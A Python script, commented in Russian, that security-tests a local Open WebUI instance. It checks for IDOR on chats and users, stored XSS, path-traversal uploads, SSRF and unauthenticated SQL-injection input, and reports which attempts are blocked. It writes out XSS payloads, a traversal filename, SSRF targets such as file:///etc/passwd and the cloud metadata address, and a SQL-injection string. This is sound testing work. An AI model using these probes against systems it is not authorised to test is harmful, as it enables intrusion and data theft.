#!/usr/bin/env python3
"""
Open WebUI Security Tester
Тесты: IDOR, injection, file upload, SSRF, auth bypass
"""
import requests
import json
import os

BASE = "http://localhost:3000"

# --- Helpers ---
def make_session(email, password):
    s = requests.Session()
    r = s.post(f"{BASE}/api/v1/auths/signin", json={"email": email, "password": password})
    if r.status_code == 200:
        token = r.json().get("token")
        s.headers["Authorization"] = f"Bearer {token}"
        s.user_id = r.json().get("id")
        print(f"  [OK] {email} → id={s.user_id}")
        return s
    print(f"  [!] Login failed {email}: {r.status_code} {r.text[:80]}")
    return None

def section(title):
    print(f"\n{'='*60}")
    print(f"  {title}")
    print(f"{'='*60}")

# ============================================================
section("ТЕСТ 1: Регистрация второго пользователя (жертва)")
# ============================================================

admin = make_session("admin@local.test", "Admin2024")

# Создаём жертву через admin endpoint
r = admin.post(f"{BASE}/api/v1/auths/add", json={
    "name": "Victim User",
    "email": "user@local.test",
    "password": "User2024",
    "role": "user"
})
print(f"  Create victim (admin): {r.status_code} {r.text[:100]}")

victim = make_session("user@local.test", "User2024")
if not victim:
    # Попробуем альтернативный endpoint
    r = admin.post(f"{BASE}/api/v1/users/create", json={
        "name": "Victim User",
        "email": "user@local.test",
        "password": "User2024",
        "role": "user"
    })
    print(f"  Create victim (alt): {r.status_code} {r.text[:100]}")
    victim = make_session("user@local.test", "User2024")

# ============================================================
section("ТЕСТ 2: IDOR — доступ к чужим чатам")
# ============================================================

# Admin создаёт чат с секретом
r = admin.post(f"{BASE}/api/v1/chats/new", json={
    "chat": {
        "title": "Secret Admin Chat",
        "messages": [{"role": "user", "content": "SECRET: admin_password_123"}],
        "models": ["test"],
        "history": {"messages": {}, "currentId": None},
        "params": {},
        "files": [],
        "tags": [],
        "timestamp": 0
    }
})
if r.status_code == 200:
    chat_id = r.json().get("id")
    print(f"  Admin chat создан: {chat_id}")

    # Жертва пытается получить чат админа
    r2 = victim.get(f"{BASE}/api/v1/chats/{chat_id}")
    if r2.status_code == 200:
        print(f"  🔴 IDOR! Жертва читает чат админа: {str(r2.json())[:150]}")
    else:
        print(f"  🟢 IDOR заблокирован: {r2.status_code}")

    # Жертва пытается удалить чат админа
    r3 = victim.delete(f"{BASE}/api/v1/chats/{chat_id}")
    if r3.status_code == 200:
        print(f"  🔴 IDOR DELETE! Жертва удалила чат админа")
    else:
        print(f"  🟢 IDOR DELETE заблокирован: {r3.status_code}")
else:
    print(f"  [!] Не удалось создать чат: {r.status_code} {r.text[:100]}")

# ============================================================
section("ТЕСТ 3: IDOR — список чатов других пользователей")
# ============================================================

# Жертва пытается получить ВСЕ чаты (admin-only endpoint)
r = victim.get(f"{BASE}/api/v1/chats/all")
print(f"  Victim GET /chats/all → {r.status_code}")
if r.status_code == 200:
    chats = r.json()
    print(f"  🔴 Жертва видит {len(chats)} чатов всех пользователей!")
else:
    print(f"  🟢 Доступ закрыт")

# ============================================================
section("ТЕСТ 4: IDOR — список всех пользователей")
# ============================================================

r = victim.get(f"{BASE}/api/v1/users/all")
print(f"  Victim GET /users/all → {r.status_code}")
if r.status_code == 200:
    users = r.json().get("users", [])
    print(f"  🔴 Жертва видит {len(users)} пользователей: {[u.get('email') for u in users]}")
else:
    print(f"  🟢 Доступ закрыт")

# ============================================================
section("ТЕСТ 5: Stored XSS через имя чата")
# ============================================================

xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert(1)>",
    "javascript:alert(1)",
    "<svg/onload=alert(1)>",
]
for payload in xss_payloads:
    r = admin.post(f"{BASE}/api/v1/chats/new", json={
        "chat": {
            "title": payload,
            "messages": [],
            "models": ["test"],
            "history": {"messages": {}, "currentId": None},
            "params": {}, "files": [], "tags": [], "timestamp": 0
        }
    })
    if r.status_code == 200:
        chat_id = r.json().get("id")
        r2 = admin.get(f"{BASE}/api/v1/chats/{chat_id}")
        if r2.status_code == 200:
            title = r2.json().get("chat", {}).get("title", "")
            if title == payload:
                print(f"  🟡 XSS payload stored verbatim: {payload[:50]}")
            else:
                print(f"  🟢 Sanitized: '{title[:50]}'")
        admin.delete(f"{BASE}/api/v1/chats/{chat_id}")

# ============================================================
section("ТЕСТ 6: File upload — path traversal и опасные типы")
# ============================================================

# Создаём тестовые файлы
test_files = [
    ("../../../tmp/evil.txt", "text/plain", b"path traversal test"),
    ("evil.html", "text/html", b"<script>alert(1)</script>"),
    ("evil.svg", "image/svg+xml", b'<svg><script>alert(1)</script></svg>'),
    ("test.txt", "text/plain", b"normal file"),
]
for filename, mime, content in test_files:
    r = admin.post(
        f"{BASE}/api/v1/files/",
        files={"file": (filename, content, mime)},
    )
    if r.status_code == 200:
        file_id = r.json().get("id")
        saved_name = r.json().get("filename", "")
        print(f"  🟡 Uploaded '{filename}' → saved as '{saved_name}' (id={file_id})")
        admin.delete(f"{BASE}/api/v1/files/{file_id}")
    else:
        print(f"  🟢 Rejected '{filename}': {r.status_code}")

# ============================================================
section("ТЕСТ 7: SSRF через Knowledge Base (document URL)")
# ============================================================

ssrf_urls = [
    "http://localhost:11434/api/tags",
    "http://127.0.0.1:22",
    "file:///etc/passwd",
    "http://169.254.169.254/latest/meta-data/",
]
for url in ssrf_urls:
    r = admin.post(f"{BASE}/api/v1/retrieval/process/web", json={
        "url": url,
        "collection_name": "test_ssrf"
    })
    print(f"  [{r.status_code}] SSRF {url[:50]}: {r.text[:80]}")

# ============================================================
section("ТЕСТ 8: Unauthenticated embedding abuse")
# ============================================================

# Большой текст без авторизации — DoS?
big_text = "A" * 10000
r = requests.get(f"{BASE}/api/v1/retrieval/ef/{big_text[:500]}")
print(f"  Embedding 500 chars (no auth) → {r.status_code}, {len(r.text)} bytes")

# SQL injection в тексте
sql_payload = "' OR '1'='1"
r = requests.get(f"{BASE}/api/v1/retrieval/ef/{sql_payload}")
print(f"  Embedding SQL injection (no auth) → {r.status_code}: {r.text[:100]}")

print("\n[*] Тестирование завершено.")
